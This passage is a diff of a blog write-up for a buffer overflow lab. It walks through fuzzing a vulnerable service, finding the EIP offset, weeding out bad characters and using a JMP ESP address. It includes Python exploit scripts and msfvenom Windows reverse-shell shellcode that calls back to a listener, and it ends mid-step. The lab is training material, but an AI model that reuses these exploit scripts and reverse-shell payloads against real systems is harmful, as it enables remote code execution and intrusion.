+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of2patterncreate %}
 
 <br />
 Update the code with string that we just created.
 
-{% raw %}
-```python
+{% capture of203 %}
 import socket
 
 url = '10.0.0.7'
@@ -928,9 +934,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x03.py' content=of203 %}
 
 <br />
 Run the code again and get the value that is stored in the EIP register.
@@ -944,19 +950,10 @@ Run the code again and get the value that is stored in the EIP register.
 <br />
 Use pattern offset to get the offset value.
 
-{% raw %}
-```bash
-┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
-└─$ msf-pattern_offset -l 1100 -q 76413176
-[*] Exact match at offset 634 
-```
-{% endraw %}
-
 <br />
 Update the code with offset that we just discovered.
 
-{% raw %}
-```python
+{% capture of204 %}
 import socket
 
 url = '10.0.0.7'
@@ -974,9 +971,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x04.py' content=of204 %}
 
 <br />
 Run the code and check the EIP for our 42s.
@@ -990,8 +987,7 @@ Run the code and check the EIP for our 42s.
 <br />
 Update the code with all of the badchars (minus \x00) so we can find the bad chars.
 
-{% raw %}
-```python
+{% capture of205 %}
 import socket
 
 url = '10.0.0.7'
@@ -1031,9 +1027,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x05.py' content=of205 %}
 
 <br />
 Check the ESP register and look for any mangles.  Notice the issue at \x23.
@@ -1047,8 +1043,7 @@ Check the ESP register and look for any mangles.  Notice the issue at \x23.
 <br />
 Remove \x23 from the badchars list.  Send the new list and re-check ESP.  Repeat this procedure until the code runs clean.
 
-{% raw %}
-```python
+{% capture of206 %}
 import socket
 
 url = '10.0.0.7'
@@ -1088,9 +1083,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x06.py' content=of206 %}
 
 <br />
 Load the narly module in WinDBG.
@@ -1122,8 +1117,7 @@ Search the memory range for a jmp esp.
 <br />
 Update the script with the memory address.
 
-{% raw %}
-```python
+{% capture of207 %}
 import socket
 from struct import pack
 
@@ -1148,14 +1142,13 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x07.py' content=of207 %}
 
 <br />
 Perform all the breakpoint analysis like we did with OVERFLOW1.  Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of2generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x23\x3c\x83\xba' -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1207,15 +1200,14 @@ payload += b"\xb1\xdc\xe5\xda\x35\xa5\x1b\x7b\xb9\x7c\x98"
 payload += b"\x9b\x58\x54\xd5\x33\xc5\x3d\x54\x5e\xf6\xe8"
 payload += b"\x9b\x67\x75\x18\x64\x9c\x65\x69\x61\xd8\x21"
 payload += b"\x82\x1b\x71\xc4\xa4\x88\x72\xcd\xa4\x2e\x8d"
-payload += b"\xee" 
-```
-{% endraw %}
+payload += b"\xee"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of2generatepayload %}
 
 <br />
 Update the code to include the msfvenom payload.
 
-{% raw %}
-```python
+{% capture of208 %}
 import socket
 from struct import pack
 
@@ -1274,45 +1266,51 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of2_0x08.py' content=of208 %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture of2start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of2start443listener %}
 
 <br />
 Run the code and catch the shell.
 
-{% raw %}
-```bash
+{% capture of2catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56186
+{% endcapture %}
+
+{% capture of2windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of2catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of2windowsshell %}
 
 <br />
-<b><u>OVERFLOW3<br /></u></b>
+<div id="overflow3">
+    <b><u>OVERFLOW3<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW3 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of300 %}
 import socket
 
 url = '10.0.0.7'
@@ -1326,15 +1324,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW3 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x00.py' content=of300 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of301 %}
 import socket
 
 url = '10.0.0.7'
@@ -1356,16 +1353,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x01.py' content=of301 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW3/thm-overflow3_0x01.py
+{% capture of3findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW3/of3_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -1379,9 +1375,9 @@ Run the code and observe the breakpoint.
 [*] Sending: 1000
 [*] Sending: 1100
 [*] Sending: 1200
-[*] Sending: 1300 
-```
-{% endraw %}
+[*] Sending: 1300
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of3findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -1395,8 +1391,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the code to hardcode the breakpoint in the attack string and 400 to make room for the payload.
 
-{% raw %}
-```python
+{% capture of302 %}
 import socket
 
 url = '10.0.0.7'
@@ -1412,9 +1407,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x02.py' content=of302 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -1428,19 +1423,17 @@ Run the code and check EIP to ensure that we still have control.
 <br />
 Use msf-pattern_create to generate a string to help dertermine the EIP offfset.
 
-{% raw %}
-```bash
+{% capture of3patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
 └─$ msf-pattern_create -l 2100
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of3patterncreate %}
 
 <br />
 Update the code to include the string that was just generated.
 
-{% raw %}
-```python
+{% capture of303 %}
 import socket
 
 url = '10.0.0.7'
@@ -1457,9 +1450,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x03.py' content=of303 %}
 
 <br />
 Run the code and check EIP to see the string in the register.
@@ -1473,19 +1466,17 @@ Run the code and check EIP to see the string in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of3findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
 └─$ msf-pattern_offset -l 2100 -q 35714234
-[*] Exact match at offset 1274 
-```
-{% endraw %}
+[*] Exact match at offset 1274
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of3findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of304 %}
 import socket
 
 url = '10.0.0.7'
@@ -1503,9 +1494,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x04.py' content=of304 %}
 
 <br />
 Run the script again and check the EIP value for our 42s to ensure that we successfully generated the offset.
@@ -1519,8 +1510,7 @@ Run the script again and check the EIP value for our 42s to ensure that we succe
 <br />
 Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of305 %}
 import socket
 
 url = '10.0.0.7'
@@ -1558,9 +1548,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x05.py' content=of305 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -1574,8 +1564,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Notice the \x11 get mangled in ESP.  Remove it from the badchars list and rerun the code.  Check ESP after everytime.  Repeat this until there is no more mangle.
 
-{% raw %}
-```python
+{% capture of306 %}
 import socket
 
 url = '10.0.0.7'
@@ -1615,15 +1604,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x06.py' content=of306 %}
 
 <br />
 Update the code to remove the badchars and leave a payload stub.
 
-{% raw %}
-```python
+{% capture of307 %}
 import socket
 
 url = '10.0.0.7'
@@ -1646,9 +1634,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x07.py' content=of307 %}
 
 <br />
 Load the narly extension in WinDBG.
@@ -1671,8 +1659,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of308 %}
 import socket
 from struct import pack
 
@@ -1696,15 +1683,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x08.py' content=of308 %}
 
 <br />
 Update the code with a nop sled.
 
-{% raw %}
-```python
+{% capture of309 %}
 import socket
 from struct import pack
 
@@ -1729,15 +1715,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x09.py' content=of309 %}
 
 <br />
 Use msfvenom to generate the paylaod.
 
-{% raw %}
-```bash
+{% capture 0f3generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b "\x00\x11\x40\x5f\xb8\xee"
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1789,15 +1774,14 @@ payload += b"\x58\xdc\x74\xba\x6c\xa5\x68\x5a\x92\x7c\x29"
 payload += b"\x7a\x71\x54\x44\x13\x2c\x3d\xe5\x7e\xcf\xe8"
 payload += b"\x2a\x87\x4c\x18\xd3\x7c\x4c\x69\xd6\x39\xca"
 payload += b"\x82\xaa\x52\xbf\xa4\x19\x52\xea\xa4\x9d\xac"
-payload += b"\x15" 
-```
-{% endraw %}
+payload += b"\x15"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=0f3generatepayload %}
 
 <br />
 Update the code with the script with the string from msfvenom.
 
-{% raw %}
-```python
+{% capture of30a %}
 import socket
 from struct import pack
 
@@ -1855,46 +1839,52 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of3_0x0a.py' content=of30a %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture of3start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
-listening on [any] 443 ... 
-```
-{% endraw %}
+listening on [any] 443 ...
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of3start443listener %}
 
 <br />
 Run the code and catch the shell.
 
-{% raw %}
-```bash
+{% capture of3catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56191
+{% endcapture %}
+
+{% capture of3windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of3catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of3windowsshell %}
 
 <br />
-<b><u>OVERFLOW4<br /></u></b>
+<div id="overflow4">
+    <b><u>OVERFLOW4<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW4 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of400 %}
 import socket
 
 url = '10.0.0.7'
@@ -1908,15 +1898,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW4 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of4_0x00.py' content=of400 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture 0f401 %}
 import socket
 
 url = '10.0.0.7'
@@ -1938,16 +1927,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x01.py' content=0f401 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW4/thm-overflow4_0x01.py
+{% capture of4findbreakpoint %}
